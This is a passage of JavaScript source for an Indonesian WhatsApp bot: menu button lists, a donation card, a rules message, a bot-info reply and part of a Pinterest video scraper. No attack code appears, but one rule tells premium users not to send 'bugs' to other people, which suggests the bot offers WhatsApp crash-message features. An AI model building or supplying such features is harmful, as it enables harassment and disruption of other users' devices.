        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'islammenu': {
let teks =`┏『 *\`乂 ɪ s ʟ ᴀ ᴍ ɪ - ᴍᴇɴᴜ 乂\`* 』━◧
║◦ *${prefix}kisahnabi*
║◦ *${prefix}asmaulhusna*
║◦ *${prefix}bacaansholat*
║◦ *${prefix}audiosurah*
║◦ *${prefix}ayatkursi*
║◦ *${prefix}doaharian*
║◦ *${prefix}niatsholat*
║◦ *${prefix}quotesislami*
║◦ *${prefix}doatahlil*
║◦ *${prefix}tafsir*
║◦ *${prefix}jadwalsholat*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ᴍᴀʜɪʀᴜ ᴀssɪsᴛᴀɴᴛ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'pyterodactylemenubutton': {
  let ReinzID_sad = `${pyterodactylemenu(prefix, hituet)}`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `allmenubutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `donasibutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `groupmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `gamemenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `beritamenubutton`, 
          },
          {
            title: "ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `cpanelmenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `primbonmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `downloadmenubutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `aimenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `animemenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `ephoto360menubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `funmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `islamimenubutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `othermenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `rpgmenubutton`, 
          },
          {
            title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `anonymousmenubutton`, 
          },
          {
            title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `randomvideomenubutton`, 
          },
          {
            title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `randomphotomenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `stickermenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `quotesmenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `stalkermenubutton`, 
          },
        ]},
      {
        title: `ᴀᴅᴍɪɴ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴄʜx`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ᴛᴏᴛᴀʟ ғɪᴛᴜʀ ᴅᴀɴ ʟᴀɪɴɴʏɴ",
            id: `infobotbutton`,
            },
            {
             title: "ᴍᴇɴᴜ  sɪᴍᴘʟᴇ",
            description: "ɪɴғᴏʀᴍᴀsɪ ᴛᴏᴛᴀʟ ғɪᴛᴜʀ ᴅᴀɴ ʟᴀɪɴɴʏɴ",
            id: `menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}
break
case 'donasibutton': {
const url = "https://telegra.ph/file/65469aa05e05c2543469c.jpg";
  async function image(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: { url }
    }, {
      upload: RyuuBotz.waUploadToServer
    });
    return imageMessage;
  }
  let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `> halo kak ${pushname}`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './node_modules/Arisu-MD/data/image/thumb.jpg' } }, { upload: RyuuBotz.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> KLIK TOMBOL DIBAWAH UNTUK MENUJU KE WEBSITE OWNER` },
                  nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"WEBSITE OWNER )","url":"https://youtu.be/dz1MhkbPthI","merchant_url":"https://youtu.be/dz1MhkbPthI"}`
                    },
                  ],
                  },
                },
              ],
              messageVersion: 1,
            },
          },
        },
      },
    },
    { quoted: m }
  );

  await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
}
break
case 'bacaperaturanbutton': {
  const cap = `┏━━━°❀ ❬ *Rules ${botname} MultiDevice* ❭ ❀°━━━┓

1. ✧ *Dilarang Melakukan Spam Kepada Bot*, Jika Ketahuan Akan Di Banned.

2. ✧ Jika Bot Tidak Menjawab 1x, Silahkan Dicoba Lagi. Tapi Jika Bot Tidak Menjawab 2x, Itu Artinya Delay, Jangan Dipakai Dulu.

3. ✧ *Jangan Spam Bot, Kalau Belum Donasi, Sadar Diri Aja Makenya* :)

4. ✧ Jika Limit Habis, Silahkan Bermain Game Untuk Mendapatkan Exp. Contoh Game: Tebak-Tebakan, RPG Game, dll.

5. ✧ *Dilarang Mengirim Virtex/Bug Ke Bot*, Walaupun Tidak Ada Efeknya :v

6. ✧ *Dilarang Keras Menelpon Bot*, Jika Menelpon Akan Otomatis Diblokir.

7. ✧ Jika Tidak Mengerti Cara Menggunakan Bot, Silahkan Bertanya Pada Member Lain. Atau Jika Belum Join Group Bot, Ketik #gcbot Dan Masuk Group Bot.

8. ✧ Jika Ada Fitur Error/Tidak Mengerti Cara Menggunakannya, Silahkan Laporkan/Tanyakan Kepada Owner.

9. ✧ Jika Bot Delay, Jangan Di Spam Terlebih Dahulu.

10. ✧ Untuk User *Premium*, *Dilarang Keras Mengirim Bug Asal Ke Orang Lain*.

┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
`
replyReinzID(cap)
}
break
case 'infobotbutton': {
  replyReinzID(`*╭─❒ 「 INFORMASI ${botname} 」*
├ OWNER: *${ownername}*
├ VERSI: *0.0.1*
├ RUNTIME: *${runtime(process.uptime())}*
├ RAM: *${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}*
╰─❒

*✦ INFORMASI SISTEM ✦*
Bot ini sedang aktif dan siap membantu kamu! 
Nikmati fitur-fitur canggih yang kami tawarkan untuk memudahkan kegiatanmu. 
Jangan lupa update terus ya biar tetap dapet fitur terbaru!

Terima kasih telah menggunakan bot kami! 😊
`)
}
break
//case 'setreply': {
//if (!isRyuuTheCreator) return reply(mess.owner)
//if ((args[0]) === 'v1'|| (args[0]) === 'V1' ){
//setreply = "v1"
//reply(`📑 *Berhasil Beralih Kedalam Reply v1*`)
//} else if ((args[0]) === 'v2'|| (args[0]) === 'V2' ){
//setreply = "v2"
//reply(`📑 *Berhasil Beralih Kedalam Reply v2*`)
//} else if ((args[0]) === 'v3'|| (args[0]) === 'V3' ){
//setreply = "v3"
//reply(`📑 *Berhasil Beralih Kedalam Reply v3*`)
//} else if ((args[0]) === 'v4'|| (args[0]) === 'V4' ){
//setreply = "v4"
//reply(`📑 *Berhasil Beralih Kedalam Reply v4*`)
//}  else if (!q) {
//reply(`📑 *Reply Yang Tersedia*
 //*⨠ v1*
// *⨠ v2*
 //*⨠ v3*
// *⨠ v4*

//📑 *Contoh : setreply v1* `)
//
//} else {
//reply("⚠️ *Menu Tidak Ditemukan*")
//}
//}
break 
case 'pinvid': case 'pinterestvideo': case 'pinvideo': {
    if (!text) return reply('ᴍᴀsᴜᴋᴋᴀɴ ᴋᴀᴛᴀ ᴋᴜɴᴄɪ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀʀɪ ᴠɪᴅᴇᴏ ᴅɪ ᴘɪɴᴛᴇʀᴇsᴛ !');
    async function PinterestVid(teks) {
        const url = `https://id.pinterest.com/resource/BaseSearchResource/get/?_=1619980301559&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${encodeURIComponent(teks)}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&source_url=%2Fsearch%2Fpins%2F%3Fq%3D${encodeURIComponent(teks)}`;
        try {
            const response = await axios.get(url);
            const data = response.data;
            if (!data || !data.resource_response || !data.resource_response.data || !data.resource_response.data.results) {
                return []; // Return an empty array if the structure is not as expected
            }
            const results = data.resource_response.data.results;
            const videoUrls = results
                .filter(pin => pin.story_pin_data) // Ensure story_pin_data exists
                .flatMap(pin => {
